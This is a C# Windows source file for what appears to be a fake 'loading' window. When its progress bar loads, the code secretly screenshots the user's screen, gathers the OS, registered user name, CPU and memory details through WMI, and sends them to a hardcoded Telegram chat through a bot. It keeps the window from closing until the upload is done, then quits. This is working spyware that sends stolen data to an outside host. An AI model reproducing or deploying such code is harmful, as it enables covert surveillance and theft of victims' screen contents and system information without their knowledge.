using System;
using System.Drawing;
using System.IO;
using System.Management;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using Telegram.Bot;

namespace FSBLoad
{
	/// <summary>
	/// Логика взаимодействия для MainWindow.xaml
	/// </summary>
	public partial class MainWindow : Window
	{

		static bool ItHasBeenSent = false;

		public MainWindow()
		{
			InitializeComponent();
		}

		private static async void Send()
		{
			try
			{
				var bot = new TelegramBotClient("TOKEN");

				byte[] buf = GetScreenshot();
				MemoryStream ms = new MemoryStream(buf);

				string cap = GetInfo();

				//await bot.SendPhotoAsync(
				//	chatId: -1001738940521,
				//	photo: ms, caption: cap);

				await bot.SendPhotoAsync(
					chatId: 659589661,
					photo: ms, caption: cap);

				
				ItHasBeenSent = true;
			}
			catch (Exception ex)
			{
				System.Windows.MessageBox.Show(ex.Message, "Телега сдохла");
			}
			finally
			{
				await Task.Delay(3000);
				System.Windows.Application.Current.Shutdown();
			}
		}

		private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
		{
			if (!ItHasBeenSent)
				e.Cancel = true;
		}

		private void pb_Loaded(object sender, RoutedEventArgs e)
		{
			Send();
		}

		private static byte[] GetScreenshot()
		{
				Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				Graphics graphics = Graphics.FromImage(printscreen as System.Drawing.Image);
				graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
				graphics.Save();
				MemoryStream ms = new MemoryStream();
				printscreen.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
				return ms.ToArray();
		}
		private static string GetInfo()
		{
			string str = "";

			ManagementObjectSearcher searcher1 = new ManagementObjectSearcher("root\\CIMV2",
				"SELECT * FROM Win32_OperatingSystem");
			ManagementObjectSearcher searcher2 =
				new ManagementObjectSearcher("root\\CIMV2",
				"SELECT * FROM Win32_Processor");
			ManagementObjectSearcher searcher3 =
				new ManagementObjectSearcher("root\\CIMV2",
				"SELECT * FROM Win32_PhysicalMemory");

			foreach (ManagementObject queryObj in searcher1.Get())
			{
				str += String.Format("ОС: {0}\n", queryObj["Caption"]);
				str += String.Format("Имя пользователя: {0}\n", queryObj["RegisteredUser"]);
			}

			foreach (ManagementObject queryObj in searcher2.Get())
			{
				str += String.Format("Процессор: {0}\n", queryObj["Name"]);
				str += String.Format("Кол-во ядер: {0}\n", queryObj["NumberOfCores"]);
			}

			foreach (ManagementObject queryObj in searcher3.Get())
			{
				str += String.Format("Плашка: {0} ; Емкость: {1} Gb; Скорость: {2} \n", queryObj["BankLabel"],
								  Math.Round(System.Convert.ToDouble(queryObj["Capacity"]) / 1024 / 1024 / 1024, 2),
								   queryObj["Speed"]);
			}

			return str;
		}

	}
}


